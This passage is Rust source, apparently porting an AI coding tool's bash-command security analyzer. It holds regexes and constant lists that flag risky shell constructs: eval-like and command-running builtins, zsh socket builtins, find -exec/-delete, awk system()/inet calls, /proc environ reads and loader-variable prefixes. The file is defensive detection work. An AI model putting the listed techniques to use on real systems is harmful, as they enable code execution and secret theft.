//! Tree-sitter AST bash-security analyzer — port of claude-code
//! `src/utils/bash/ast.ts` `parseForSecurity` / `parseForSecurityFromAst`.
//! Compiled only under the `bash-ast` feature.
//!
//! claude parses a bash command with tree-sitter and, when the parse succeeds,
//! extracts a flat list of simple commands for per-command permission matching
//! ([`ParseForSecurityResult::Simple`]); commands using a shell feature it
//! can't statically analyze are [`ParseForSecurityResult::TooComplex`] (→ ask);
//! when the parser is unavailable it returns [`ParseForSecurityResult::ParseUnavailable`]
//! (→ the legacy regex battery in [`crate::bash_security`]). `bashPermissions.ts`
//! routes these three verdicts (the legacy battery the port currently runs for
//! EVERY command is, in claude, only the `parse-unavailable` fallback).
//!
//! ## Incremental port status
//! PIECE 2a (this module's first commit): the verdict types + the PRE-CHECK gate
//! ([`pre_check_too_complex`], the regex differentials `parseForSecurityFromAst`
//! runs BEFORE trusting tree-sitter) + the [`parse_for_security`] skeleton. The
//! AST → simple-command extraction (`walkProgram` / `collectCommands` /
//! `walkCommand` / …, ~2000 lines of `ast.ts`) is NOT ported yet: until it is,
//! [`parse_for_security`] returns [`ParseForSecurityResult::ParseUnavailable`]
//! for any command that passes the pre-checks, so the caller keeps the legacy
//! battery (no behavior change — and the whole module is `bash-ast`-gated OFF by
//! default). Later pieces replace that stand-in with the real extraction and
//! wire the verdict into the permission decision.

use regex::Regex;
use std::collections::HashMap;
use std::sync::OnceLock;
use tree_sitter::{Node, Tree};

/// One redirect on a simple command (TS `Redirect`, `ast.ts:25`).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Redirect {
    /// Redirect operator (`>`, `>>`, `<`, `<<`, `>&`, `>|`, `<&`, `&>`, `&>>`, `<<<`).
    pub op: String,
    /// Redirect target (filename / fd / herestring body).
    pub target: String,
    /// Optional leading file descriptor (`2>` → `fd: Some(2)`).
    pub fd: Option<i64>,
}

/// A flattened simple command (TS `SimpleCommand`, `ast.ts:31`).
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct SimpleCommand {
    /// `argv[0]` is the command name; the rest are arguments with quotes resolved.
    pub argv: Vec<String>,
    /// Leading `VAR=val` assignments, in order.
    pub env_vars: Vec<(String, String)>,
    /// Output/input redirects.
    pub redirects: Vec<Redirect>,
    /// Original source span for this command (UI display).
    pub text: String,
}

/// Verdict of [`parse_for_security`] (TS `ParseForSecurityResult`, `ast.ts:42`).
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ParseForSecurityResult {
    /// Statically analyzable — the flat list of simple commands.
    Simple {
        /// The extracted simple commands (empty for an empty command).
        commands: Vec<SimpleCommand>,
    },
    /// Uses a shell feature we can't statically analyze → the caller must ask.
    TooComplex {
        /// Human-readable reason (byte-faithful to the TS `reason`).
        reason: String,
    },
    /// tree-sitter parse unavailable → the caller falls back to the legacy
    /// regex battery ([`crate::bash_security::bash_command_is_safe`]).
    ParseUnavailable,
}

// ── Pre-check regexes (TS `ast.ts:254-314`): tree-sitter/bash differentials
// detected on the RAW command before trusting tree-sitter's tokenization. ──

macro_rules! lazy_re {
    ($name:ident, $pat:expr) => {
        // `dead_code`: some regexes are consumed only by later port layers
        // (walker / semantic clusters); they are defined here so all const
        // patterns live together.
        #[allow(dead_code)]
        // Several of these are named after the bash flag SET they match
        // (`declare_niaAEF_re` ⇒ `-…[niaAEF]`). The case is the meaning, so
        // snake-casing them would delete what the name says.
        #[allow(non_snake_case)]
        fn $name() -> &'static Regex {
            static RE: OnceLock<Regex> = OnceLock::new();
            RE.get_or_init(|| Regex::new($pat).expect("valid pre-check regex"))
        }
    };
}

// CONTROL_CHAR_RE: control chars bash drops but that confuse static analysis.
lazy_re!(control_char_re, r"[\x00-\x08\x0B-\x1F\x7F]");
// UNICODE_WHITESPACE_RE: invisible Unicode whitespace bash treats as a word char.
lazy_re!(
    unicode_whitespace_re,
    r"[\u{00A0}\u{1680}\u{2000}-\u{200B}\u{2028}\u{2029}\u{202F}\u{205F}\u{3000}\u{FEFF}]"
);
// BACKSLASH_WHITESPACE_RE: `\ `/`\t`, or an odd-count `\<NL>` continuation
// that joins tokens across lines in a way tree-sitter tokenizes differently.
lazy_re!(
    backslash_whitespace_re,
    r"\\[ \t]|(?:^|[^ \t\\])(?:\\\\)*\\\n|[ \t](?:\\\\)+\\\n"
);
// ZSH_TILDE_BRACKET_RE: zsh `~[name]` dynamic named-directory expansion.
lazy_re!(zsh_tilde_bracket_re, r"~\[");
// ZSH_EQUALS_EXPANSION_RE: word-initial `=cmd` zsh EQUALS expansion.
lazy_re!(zsh_equals_expansion_re, r"(?:^|[\s;&|])=[a-zA-Z_]");
// ZSH_NUMERIC_RANGE_RE: zsh `<N-M>` numeric-range glob.
lazy_re!(zsh_numeric_range_re, r"<\d*-\d*>");
// BRACE_WITH_QUOTE_RE: `{` + quote char (brace-expansion obfuscation), run on
// the brace-masked command so quoted JSON like `'{"k":"v"}'` doesn't trip it.
lazy_re!(brace_with_quote_re, r#"\{[^}]*['"]"#);

// ────────────────────────────────────────────────────────────────────────────
// L1: const sets + leaf helpers.
//
// Faithful 1:1 port of the `ast.ts` const sets (54-314, 2060-2204) and the leaf
// helpers (`containsAnyPlaceholder`, `stripRawString`, `tooComplex`,
// `resolveSimpleExpansion`, `applyVarToScope`, `nodeTypeId`). The walker clusters
// (`walkProgram`/`collectCommands`/…) consume these; they land in later layers,
// so [`parse_for_security`]'s stand-in is unchanged in this layer.
//
// `#[allow(dead_code)]` is set on the items the walkers will consume — they are
// not referenced yet in this layer (the parser stand-in is untouched).
// ────────────────────────────────────────────────────────────────────────────

// ── Placeholders (ast.ts:74,82) ──

/// Placeholder for a recursively-extracted `$()` in the outer argv (ast.ts:74).
const CMDSUB_PLACEHOLDER: &str = "__CMDSUB_OUTPUT__";
/// Placeholder for a `$VAR` reference to a tracked non-literal value (ast.ts:82).
const VAR_PLACEHOLDER: &str = "__TRACKED_VAR__";

// ── Structural / separator node-type sets (ast.ts:54,65,186,224) ──

/// Node types that nest commands (TS `STRUCTURAL_TYPES`, ast.ts:54).
#[allow(dead_code)]
pub(crate) const STRUCTURAL_TYPES: &[&str] =
    &["program", "list", "pipeline", "redirected_statement"];

/// Command-separator leaf tokens (TS `SEPARATOR_TYPES`, ast.ts:65). The final
/// member is a literal newline.
#[allow(dead_code)]
pub(crate) const SEPARATOR_TYPES: &[&str] = &["&&", "||", "|", ";", "&", "|&", "\n"];

/// Node types that mean "cannot be statically analyzed" (TS `DANGEROUS_TYPES`,
/// ast.ts:186). ORDER MATTERS: [`node_type_id`] indexes into it (TS
/// `DANGEROUS_TYPE_IDS = [...DANGEROUS_TYPES]`). Membership via `.contains`.
pub(crate) const DANGEROUS_TYPES: &[&str] = &[
    "command_substitution",
    "process_substitution",
    "expansion",
    "simple_expansion",
    "brace_expression",
    "subshell",
    "compound_statement",
    "for_statement",
    "while_statement",
    "until_statement",
    "if_statement",
    "case_statement",
    "function_definition",
    "test_command",
    "ansi_c_string",
    "translated_string",
    "herestring_redirect",
    "heredoc_redirect",
];

/// Redirect operator tokens, kind == canonical op (TS `REDIRECT_OPS`, ast.ts:224).
/// `<<` is NOT a member (heredocs go via the heredoc walker).
#[allow(dead_code)]
pub(crate) const REDIRECT_OPS: &[&str] = &[">", ">>", "<", ">&", "<&", ">|", "&>", "&>>", "<<<"];

// ── Variable-resolution sets (ast.ts:125,167) ──

/// Bash-set env vars whose value is shell-controlled (TS `SAFE_ENV_VARS`,
/// ast.ts:125). Resolvable to [`VAR_PLACEHOLDER`] only INSIDE strings.
pub(crate) const SAFE_ENV_VARS: &[&str] = &[
    "HOME",
    "PWD",
    "OLDPWD",
    "USER",
    "LOGNAME",
    "SHELL",
    "PATH",
    "HOSTNAME",
    "UID",
    "EUID",
    "PPID",
    "RANDOM",
    "SECONDS",
    "LINENO",
    "TMPDIR",
    "BASH_VERSION",
    "BASHPID",
    "SHLVL",
    "HISTFILE",
    "IFS",
];

/// Special shell vars (`$?`, `$$`, …) (TS `SPECIAL_VAR_NAMES`, ast.ts:167).
/// Deliberately EXCLUDES `@` and `*` (positional params are empty in a fresh
/// BashTool shell; a placeholder would lie).
pub(crate) const SPECIAL_VAR_NAMES: &[&str] = &["?", "$", "!", "#", "0", "-"];

// ── Dangerous variable-name battery (TS `ntg`/`Y3i`/`GVc`, `O3i`/`Itt`) ──

/// TS `ntg`: lowercase exec-influencing / shell-behavior var names, matched
/// case-INSENSITIVELY by [`o3i`]. Membership via lowercased `.contains`.
pub(crate) const DANGEROUS_VAR_NTG: &[&str] = &[
    "path",
    "home",
    "tmpprefix",
    "bash_env",
    "env",
    "cdpath",
    "globignore",
    "shell",
    "fpath",
    "bash_loadables_path",
    "module_path",
    "manpath",
    "mailpath",
    "readnullcmd",
    "nullcmd",
    "histfile",
    "zdotdir",
    "functions",
    "commands",
    "aliases",
    "galiases",
    "saliases",
    "lang",
    "language",
    "lc_all",
    "lc_ctype",
    "lc_collate",
    "lc_messages",
    "lc_numeric",
    "lc_time",
    "histchars",
    "textdomain",
    "textdomaindir",
];

/// TS `Y3i`: integer-attribute / volatile shell vars matched by EXACT case
/// (part of the [`itt`] battery).
pub(crate) const DANGEROUS_VAR_Y3I: &[&str] = &[
    "RANDOM",
    "SECONDS",
    "LINENO",
    "OPTIND",
    "MAILCHECK",
    "HISTCMD",
    "SRANDOM",
    "EPOCHSECONDS",
    "EPOCHREALTIME",
    "COLUMNS",
    "LINES",
    "SHLVL",
    "ERRNO",
    "TMOUT",
    "HISTSIZE",
    "SAVEHIST",
    "TRY_BLOCK_ERROR",
    "TRY_BLOCK_INTERRUPT",
    "KEYTIMEOUT",
    "LISTMAX",
    "LOGCHECK",
    "PERIOD",
    "FUNCNEST",
    "UID",
    "EUID",
    "GID",
    "EGID",
    "ZLE_RPROMPT_INDENT",
    "MBEGIN",
    "MEND",
    "PPID",
    "ARGC",
    "ZSH_SUBSHELL",
    "TTYIDLE",
    "status",
];

/// TS `GVc`: generally-volatile shell vars whose runtime value cannot be a
/// tracked literal (gated FIRST in [`resolve_simple_expansion`] and used to
/// reject dangerous loop variables). Case-sensitive (holds both `REPLY` and
/// `reply`, etc.).
#[allow(dead_code)] // consumed by resolve_simple_expansion / loop-var guard (later layers)
pub(crate) const VOLATILE_VARS_GVC: &[&str] = &[
    "_",
    "RANDOM",
    "SECONDS",
    "LINENO",
    "BASH_COMMAND",
    "FUNCNAME",
    "EPOCHSECONDS",
    "EPOCHREALTIME",
    "SRANDOM",
    "BASHPID",
    "REPLY",
    "reply",
    "PIPESTATUS",
    "pipestatus",
    "BASH_SOURCE",
    "DIRSTACK",
    "GROUPS",
    "BASH_ARGV",
    "BASH_ARGC",
    "BASH_SUBSHELL",
    "BASH_LINENO",
    "BASH_REMATCH",
    "MATCH",
    "match",
    "MBEGIN",
    "MEND",
    "mbegin",
    "mend",
    "OPTARG",
    "OPTIND",
    "argv",
    "FIGNORE",
    "fignore",
    "PSVAR",
    "psvar",
    "WATCH",
    "watch",
    "HISTCHARS",
    "histchars",
    "PS1",
    "PROMPT",
    "prompt",
    "PS2",
    "PROMPT2",
    "PS3",
    "PROMPT3",
    "PS4",
    "PROMPT4",
    "RPS1",
    "RPROMPT",
    "RPS2",
    "RPROMPT2",
];

/// TS `H3i`: command-prefix WRAPPERS stripped by the [`xeg`] var-write pre-scan.
pub(crate) const XEG_WRAPPERS: &[&str] = &["command", "builtin", "noglob", "nocorrect", "time"];

/// TS `qVc`: declare-family assignment builtins whose `NAME=value` operands
/// write shell variables (used by [`xeg`]).
pub(crate) const XEG_ASSIGN_BUILTINS: &[&str] =
    &["declare", "typeset", "local", "export", "readonly"];

/// TS `jVc`: special builtins whose PRECEDING `VAR=value` env assignments persist
/// in the current shell (used by [`xeg`]).
pub(crate) const XEG_SPECIAL_BUILTINS: &[&str] = &[
    ":", "break", "continue", "return", "exit", "shift", "times", "set", "export", "readonly",
    "unset",
];

/// TS `itg`: `print` short options that consume a following value operand
/// (used by [`xeg`]'s `print -v NAME` handler).
pub(crate) const XEG_PRINT_VALUE_FLAGS: &[&str] = &["-f", "-C", "-x", "-X", "-u"];

/// TS `O3i` (`ast.ts`): a lowercase-matched exec-influencing var name, or one of
/// the `ld_`/`dyld_`/`bash_func_` dynamic-linker / exported-function prefixes.
#[must_use]
pub(crate) fn o3i(name: &str) -> bool {
    let t = name.to_ascii_lowercase();
    DANGEROUS_VAR_NTG.contains(&t.as_str())
        || t.starts_with("ld_")
        || t.starts_with("dyld_")
        || t.starts_with("bash_func_")
}

/// TS `Itt` (`ast.ts`): a variable name that influences command execution
/// (exec-influencing / integer-attr / `IFS` / `PS4` / `PROMPT4`). Writing or
/// `unset`ting such a name defeats static analysis.
#[must_use]
pub(crate) fn itt(name: &str) -> bool {
    o3i(name)
        || name == "IFS"
        || name == "PS4"
        || name == "PROMPT4"
        || DANGEROUS_VAR_Y3I.contains(&name)
}

// ── checkSemantics tail sets (ast.ts:2060-2204) — consumed by the semantic
// cluster (later layer); defined here so all const sets live in one place. ──

/// Zsh module builtins, catchable only by name (TS `ZSH_DANGEROUS_BUILTINS`,
/// ast.ts:2060).
pub(crate) const ZSH_DANGEROUS_BUILTINS: &[&str] = &[
    "zmodload", "emulate", "sysopen", "sysread", "syswrite", "sysseek", "zpty", "ztcp", "zsocket",
    "zf_rm", "zf_mv", "zf_ln", "zf_chmod", "zf_chown", "zf_mkdir", "zf_rmdir", "zf_chgrp",
    "repeat", "foreach", "zcompile", "setopt", "unsetopt", "disable", "shopt",
];

/// Builtins that evaluate their arguments as shell code (TS `EVAL_LIKE_BUILTINS`,
/// ast.ts checkSemantics `k1n`). NOTE: `command`/`builtin`/`noglob` are NOT here —
/// the 2.1.195 binary strips them as command-prefix WRAPPERS (see
/// [`check_semantics`] wrapper loop), so by the time the name battery runs they
/// have already been unwrapped to the real command.
pub(crate) const EVAL_LIKE_BUILTINS: &[&str] = &[
    "eval",
    "source",
    ".",
    "exec",
    "nocorrect",
    "fc",
    "coproc",
    "trap",
    "enable",
    "mapfile",
    "readarray",
    "hash",
    "bind",
    "complete",
    "compgen",
    "alias",
    "let",
];

/// Builtins whose argument IS run as a command — `watch rm -rf`, `flock f rm`,
/// etc. (TS checkSemantics `C$t`). Denied when they carry any operand.
pub(crate) const RUNS_ARG_COMMANDS: &[&str] = &[
    "watch", "ionice", "chrt", "setsid", "taskset", "strace", "ltrace", "script", "flock",
    "unshare", "nsenter",
];

/// Declare-family + zsh assignment builtins whose operands are scrutinised for
/// flags/subscripts that change assignment-eval semantics (TS checkSemantics
/// `w$t`).
pub(crate) const DECLARE_FAMILY: &[&str] = &[
    "declare",
    "typeset",
    "local",
    "export",
    "readonly",
    "print",
    "getopts",
    "set",
    "zparseopts",
    "zformat",
    "zstyle",
    "autoload",
    "shift",
    "exit",
    "return",
    "break",
    "continue",
    "bye",
    "logout",
    "vared",
    "private",
    "getln",
    "zregexparse",
    "float",
    "integer",
];

/// zsh `typeset`-family subset whose flags trigger matheval of the RHS (TS
/// checkSemantics `_ra`).
pub(crate) const ZSH_TYPESET_FAMILY: &[&str] = &[
    "declare", "typeset", "local", "export", "readonly", "private", "float", "integer",
];

/// `set -o <name>` option names that are statically safe (TS checkSemantics
/// `poo`). Compared after lowercasing and stripping `_`/`-`.
pub(crate) const SET_O_SAFE: &[&str] = &[
    "pipefail",
    "errexit",
    "nounset",
    "xtrace",
    "noglob",
    "noclobber",
    "verbose",
    "monitor",
    "notify",
    "vi",
    "emacs",
    "errtrace",
    "functrace",
    "hashall",
    "physical",
    "ignoreeof",
];

/// `set -<letter>` single-letter options that are statically safe (TS
/// checkSemantics `moo`).
pub(crate) const SET_SAFE_LETTERS: &[&str] = &[
    "e", "u", "x", "f", "C", "v", "m", "b", "E", "T", "h", "P", "n",
];

/// `find` primaries that execute commands or modify files (TS checkSemantics
/// `coo`). Auto-allow via a `Bash(find:*)` prefix rule is unsafe with any of these.
pub(crate) const FIND_ACTION_FLAGS: &[&str] = &[
    "-exec",
    "-execdir",
    "-ok",
    "-okdir",
    "-delete",
    "-fprint",
    "-fprint0",
    "-fprintf",
    "-fls",
    "-files0-from",
];

/// `find` primaries that take a value operand (skip the operand; TS checkSemantics
/// `R$t`). `-newerXY` is matched by [`find_newer_re`] instead.
pub(crate) const FIND_VALUE_FLAGS: &[&str] = &[
    "-name",
    "-iname",
    "-path",
    "-ipath",
    "-lname",
    "-ilname",
    "-regex",
    "-iregex",
    "-wholename",
    "-iwholename",
    "-samefile",
    "-newer",
    "-anewer",
    "-cnewer",
    "-mnewer",
    "-perm",
    "-user",
    "-group",
    "-uid",
    "-gid",
    "-size",
    "-type",
    "-xtype",
    "-fstype",
    "-inum",
    "-links",
    "-used",
    "-context",
    "-amin",
    "-cmin",
    "-mmin",
    "-atime",
    "-ctime",
    "-mtime",
    "-mindepth",
    "-maxdepth",
    "-printf",
    "-regextype",
    "-D",
    "-f",
    "-flags",
    "-Bnewer",
    "-Btime",
    "-Bmin",
    "-files0-from",
    "-xattrname",
];

/// `read` flags that consume a NUMERIC value operand (TS checkSemantics `yra`).
pub(crate) const READ_NUMERIC_DATA_FLAGS: &[&str] = &["-t", "-n", "-N"];

/// Builtins → NAME-operand flags that evaluate array subscripts (TS
/// `SUBSCRIPT_EVAL_FLAGS` / `uoo`). Value-vecs are insertion-ordered (the
/// matched flag is interpolated into the reason string).
pub(crate) const SUBSCRIPT_EVAL_FLAGS: &[(&str, &[&str])] = &[
    ("test", &["-v", "-R", "-t"]),
    ("[", &["-v", "-R", "-t"]),
    ("[[", &["-v", "-R", "-t"]),
    ("printf", &["-v"]),
    ("read", &["-a"]),
    ("unset", &["-v"]),
    ("wait", &["-p"]),
];

/// `[[ … ]]` arithmetic comparison operators (TS `TEST_ARITH_CMP_OPS`,
/// ast.ts:2169).
pub(crate) const TEST_ARITH_CMP_OPS: &[&str] = &["-eq", "-ne", "-lt", "-le", "-gt", "-ge"];

/// Builtins taking a bare NAME operand that may contain a subscript (TS
/// `BARE_SUBSCRIPT_NAME_BUILTINS`, ast.ts:2182).
pub(crate) const BARE_SUBSCRIPT_NAME_BUILTINS: &[&str] = &["read", "unset"];

/// `read` flags that consume the next token as data (TS `READ_DATA_FLAGS`,
/// ast.ts:2189).
pub(crate) const READ_DATA_FLAGS: &[&str] = &["-p", "-d", "-n", "-N", "-t", "-u", "-i"];

/// Shell reserved keywords (TS `SHELL_KEYWORDS`, `bashParser.ts:87`). A keyword
/// as `argv[0]` means a tree-sitter mis-parse — never a legitimate command name.
pub(crate) const SHELL_KEYWORDS: &[&str] = &[
    "if", "then", "elif", "else", "fi", "while", "until", "for", "in", "do", "done", "case",
    "esac", "function", "select",
];

// ── Regexes specific to L1 (others already exist in the foundation) ──

// BARE_VAR_UNSAFE_RE (ast.ts:110): space, tab, newline, *, ?, [. JS allows a
// bare `[` in a char class; Rust `regex` requires `\[`.
lazy_re!(bare_var_unsafe_re, r"[ \t\n*?\[]");

// BRACE_EXPANSION_RE (ast.ts:245): {a,b} or {a..b}. (Consumed by walker layers.)
lazy_re!(brace_expansion_re, r"\{[^{}\s]*(,|\.\.)[^{}\s]*\}");

// ── xeg (per-command var-write pre-scan) regexes ──
// Wrapper flag stripped inside xeg's prefix loop: `/^-[-pvV]*$/` (bare `-`, `--`,
// and `command`-style `-pvV` combinations).
lazy_re!(xeg_wrapper_flag_re, r"^-[-pvV]*$");
// Leading `VAR[sub]?+?=` assignment word (JS `\w` → ASCII `[A-Za-z0-9_]`).
lazy_re!(
    xeg_assign_word_re,
    r"^[A-Za-z_][A-Za-z0-9_]*(\[[^\]]*\])?\+?="
);
// mapfile/readarray value-consuming short flag: `/^-[dnOsuCc]$/`.
lazy_re!(xeg_mapfile_flag_re, r"^-[dnOsuCc]$");
// pushd/popd `-n` flag (no directory change): `/^-[a-zA-Z]*n[a-zA-Z]*$/`.
lazy_re!(xeg_pushd_n_re, r"^-[a-zA-Z]*n[a-zA-Z]*$");
// popd stack-index operands that do NOT change PWD: `/^\+0*[1-9]/` and `/^-0+$/`.
lazy_re!(xeg_popd_plus_re, r"^\+0*[1-9]");
lazy_re!(xeg_popd_minus_re, r"^-0+$");

// ── pUr/HVc (body-write invalidation pre-scan) regexes ──
// HVc `word` flag that is safe to skip: `/^-[fvn]+$/`.
lazy_re!(hvc_fvn_flag_re, r"^-[fvn]+$");
// HVc backslash-escaped bare NAME operand: `/^\\?[A-Za-z_][A-Za-z0-9_]*$/`.
lazy_re!(hvc_bslash_name_re, r"^\\?[A-Za-z_][A-Za-z0-9_]*$");
// pUr declaration-command `NAME+?=` prefix: `/^([A-Za-z_][A-Za-z0-9_]*)\+?=/`.
lazy_re!(pur_decl_assign_re, r"^([A-Za-z_][A-Za-z0-9_]*)\+?=");
// PROC_ENVIRON_RE (ast.ts:2197): `.*` (procfs resolves `..`), NOT `[^/]*`.
lazy_re!(proc_environ_re, r"/proc/.*/environ");
// NEWLINE_HASH_RE (ast.ts:2204): newline, then 0+ space/tab, then `#`.
lazy_re!(newline_hash_re, "\n[ \t]*#");

// ── checkSemantics wrapper-strip regexes (ast.ts:113-115, 2243-2304) ──
// STDBUF_SHORT_SEP_RE (ast.ts:113): `-i`/`-o`/`-e` (value in next arg).
lazy_re!(stdbuf_short_sep_re, r"^-[ioe]$");
// STDBUF_SHORT_FUSED_RE (ast.ts:114): `-o0` (value fused into the flag arg).
lazy_re!(stdbuf_short_fused_re, r"^-[ioe].");
// STDBUF_LONG_RE (ast.ts:115): `--output=MODE` long form.
lazy_re!(stdbuf_long_re, r"^--(input|output|error)=");
// timeout long flag with fused value (ast.ts:2243): `--kill-after=N`/`--signal=SIG`.
lazy_re!(
    timeout_long_value_re,
    r"^--(?:kill-after|signal)=[A-Za-z0-9_.+-]+$"
);
// timeout signal/duration value charset (ast.ts:2248,2263): allowlisted value.
lazy_re!(timeout_value_re, r"^[A-Za-z0-9_.+-]+$");
// timeout fused short flag with value (ast.ts:2266): `-k5`/`-sTERM`.
lazy_re!(timeout_ks_fused_re, r"^-[ks][A-Za-z0-9_.+-]+$");
// timeout duration (ast.ts:2279): `5`, `5s`, `5.5`, optional `[smhd]` suffix.
// `[0-9]` not `\d` — the Rust `regex` crate's `\d` is Unicode (`\p{Nd}`), but JS
// `\d` is ASCII; a Unicode-digit duration must stay non-matching (fail-closed).
lazy_re!(timeout_duration_re, r"^[0-9]+(?:\.[0-9]+)?[smhd]?$");
// nice `-n N` value / legacy `-N` (ast.ts:2300,2302): signed / negative integer.
lazy_re!(nice_n_value_re, r"^-?[0-9]+$");
lazy_re!(nice_legacy_re, r"^-[0-9]+$");
// nice argument carrying an expansion (ast.ts:2304): `$`, `(`, or backtick.
lazy_re!(nice_expansion_re, r"[$(`]");
// jq dangerous flags (2.1.195 checkSemantics): combined `-nf`/`-rf` (any letters
// then f/L) plus the long forms. WIDER than the older `-[fL]`-prefix form.
lazy_re!(
    jq_dangerous_flags_re,
    r"^(?:-[A-Za-z]*[fL]|--(?:from-file|rawfile|slurpfile|library-path)(?:$|=))"
);
// jq filter containing an include/import directive (2.1.195): module loading.
lazy_re!(jq_include_re, r"\b(?:include|import)\b");
// fc short-opt containing `e`/`s` (2.1.195 `^[+-].*[es]`): re-execute / editor.
lazy_re!(fc_exec_re, r"^[+-].*[es]");
// compgen short-opt containing C/F/W (2.1.195 `^[+-].*[CFW]`): exec / func / word-expand.
lazy_re!(compgen_exec_re, r"^[+-].*[CFW]");

// ── checkSemantics superset regexes (2.1.195 binary `checkSemantics`/`Mra`) ──
// Nqe — bash arithmetic-context numeric literal (hex / base#n / decimal).
lazy_re!(
    numeric_arith_re,
    r"^-?(0[xX][0-9a-fA-F]+|[0-9]+#[0-9a-zA-Z]+|[0-9]+)$"
);
// Tra — `read` numeric value operand (decimal / float).
lazy_re!(read_numeric_re, r"^(?:[0-9]+(?:\.[0-9]+)?|\.[0-9]+)$");
// Wrp — argv element that is a subscripted NAME (`arr[…`).
lazy_re!(subscripted_name_re, r"^[A-Za-z_][A-Za-z0-9_]*\[");
// ident followed by `[` anywhere — a subscripted identifier inside an operand.
lazy_re!(ident_subscript_re, r"[A-Za-z_][A-Za-z0-9_]*\[");
// declare/typeset/local flag changing assignment eval: -…[niaAEF].
lazy_re!(declare_niaAEF_re, r"^[+-].*[niaAEF]");
// zsh typeset matheval flag: -…[iEF].
lazy_re!(declare_iEF_re, r"^[+-].*[iEF]");
// declare/export/readonly/private pattern-assign flag: -…m / +…m.
lazy_re!(declare_m_re, r"^[+-].*m");
// zsh typeset tied-pair flag: -…T / +…T.
lazy_re!(declare_T_re, r"^[+-].*T");
// array-subscript operand that also carries an expansion (`[` + `$`/backtick).
lazy_re!(subscript_expansion_re, r"[$`]");
// leading `+`/`-` (float/integer operand with an explicit sign is benign).
lazy_re!(leading_sign_re, r"^[+-]");
// print `-P` prompt-expansion flag (`^[+-].*P`).
lazy_re!(print_p_flag_re, r"^[+-].*P");
// command substitution or backtick in an operand (`$(` or backtick).
lazy_re!(cmdsub_or_backtick_re, r"\$\(|`");
// jobs `-x` (executes its argument): `^[+-].*x`.
lazy_re!(jobs_x_re, r"^[+-].*x");
// `set` token begins with `-` or `+`.
lazy_re!(set_flag_re, r"^[-+]");
// find argument carrying a glob metacharacter (`[`, `]`, `*`, `?`).
lazy_re!(find_glob_re, r"[\[\]*?]");
// find `-newerXY` value-taking primary.
lazy_re!(find_newer_re, r"^-newer[aBcm][aBcmt]$");
// command-wrapper `command -pvV` allowed flags.
lazy_re!(command_pvv_re, r"^-[pvV]+$");

// ── L2 regexes (ast.ts:1659, 1773, 1835, 1894-1896) ──

// ARITH_LEAF_RE (ast.ts:1659): safe leaf tokens inside `$((…))` — VERBATIM,
// anchored. Numeric literals + operator/paren tokens only; a bare variable_name
// leaf is rejected (arithmetic injection). The alternation members `[`/`]` are
// escaped for the Rust `regex` char-class (`\[`/`\]`).
lazy_re!(
    arith_leaf_re,
    r"^(?:[0-9]+|0[xX][0-9a-fA-F]+|[0-9]+#[0-9a-zA-Z]+|[-+*/%^&|~!<>=?:(),]+|<<|>>|\*\*|&&|\|\||[<>=!]=|\$\(\(|\)\))$"
);
// jq `system(` detector inside extractSafeCatHeredoc (ast.ts:1773): `/\bsystem\s*\(/`.
lazy_re!(jq_system_re, r"\bsystem\s*\(");
// walkString zsh `$name:mod` modifier differential: `/^:[a-zA-Z&]/`.
lazy_re!(zsh_colon_mod_re, r"^:[a-zA-Z&]");
// walkString zsh `$name[expr]` / `$name:mod` on a special var: `/^\w*(\[|:[a-zA-Z&])/`
// (JS `\w` → ASCII `[A-Za-z0-9_]`).
lazy_re!(zsh_name_subscript_re, r"^[A-Za-z0-9_]*(\[|:[a-zA-Z&])");
// awk program battery (TS `YVc`, permissionSetup.ts). The regex-crate has no
// lookbehind, so `(?<![A-Za-z_])` is emulated with `(?:^|[^A-Za-z_])` — we only
// test `is_match`, so consuming the guard char is harmless.
lazy_re!(awk_system_re, r"(?:^|[^A-Za-z_])system[\s\\]*\(");
lazy_re!(awk_pipe_cmd_re, r##"(?:^|[^|])\|&?[^/|%";#{}]*""##);
lazy_re!(awk_pipe_getline_re, r"(?:^|[^|])\|&?[\s\\]*getline\b");
lazy_re!(
    awk_include_re,
    r"@[\s\\]*(?:load|include)\b|@[\s\\]*\w+(?:::\w+)?(?:\[[^\]]*\])*[\s\\]*\("
);
lazy_re!(awk_extension_re, r"(?:^|[^A-Za-z_])extension[\s\\]*\(");
lazy_re!(awk_inet_re, r#""/inet[46]?/"#);
// awk program-supplying flags (read program from file / load extensions /
// supply program fragments): `/^-[bcCghIkMnNOPrsStV]*[fEileDW]/` and
// `/^--(?:fil|e|i|lo|s|de)/`.
lazy_re!(
    awk_program_flag_short_re,
    r"^-[bcCghIkMnNOPrsStV]*[fEileDW]"
);
lazy_re!(awk_program_flag_long_re, r"^--(?:fil|e|i|lo|s|de)");
// xargs-awk value-consuming flags (TS `rtg`): `-F`/`-v`/`-W <value>` and
// `--fie`/`--a`/`--as` skip their following value when scanning for a program.
lazy_re!(awk_xargs_value_flag_re, r"^(?:-[FvW]$|--(?:fie|a$|as))");
// Valid bash variable name (ast.ts:1835): `[A-Za-z_][A-Za-z0-9_]*`, anchored.
lazy_re!(valid_var_name_re, r"^[A-Za-z_][A-Za-z0-9_]*$");
// Integer-attributed shell variable assignment value (claude-code 2.1.251):
// only an unsigned decimal literal with at most 18 digits is statically safe.
lazy_re!(integer_attribute_value_re, r"^(0|[1-9][0-9]{0,17})$");
// PS4 `${IDENT}` reference, stripped before the charset check (ast.ts:1896).
lazy_re!(ps4_dollar_brace_re, r"\$\{[A-Za-z_][A-Za-z0-9_]*\}");
// PS4 safe charset after stripping `${VAR}` refs (ast.ts:1895): A-Za-z0-9, space,
// `_ + : . / =`, `[`, `]`, and `-` (trailing → literal). `[`/`]` escaped for Rust.
lazy_re!(ps4_charset_re, r"^[A-Za-z0-9 _+:./=\[\]-]*$");
// declare/typeset/local flag that changes assignment semantics: -…[niaA]
// (nameref / integer / array), ast.ts:627.
lazy_re!(declare_flag_re, r"^-[a-zA-Z]*[niaA]");
// declare bare positional with an array subscript (`x[…]`), ast.ts:647.
lazy_re!(declare_subscript_re, r"^[^=]*\[");
// A `$<ident>` in node.text — a resolved simple_expansion (ast.ts:1350).
lazy_re!(dollar_ident_re, r"\$[A-Za-z_]");
// Chars that force shell-escape when rebuilding .text from argv (ast.ts:1353).
// Backtick, brackets and the metacharacter set; `[`/`]` escaped for Rust.
lazy_re!(shell_escape_re, "[\"'\\\\ \t\n$`;|&<>(){}*?\\[\\]~#]");

// ── Leaf helpers (ast.ts:94, 213, 2029, 2033, 1937, 2017) ──

/// TS `containsAnyPlaceholder` (ast.ts:94). SUBSTRING check (not equality) — a
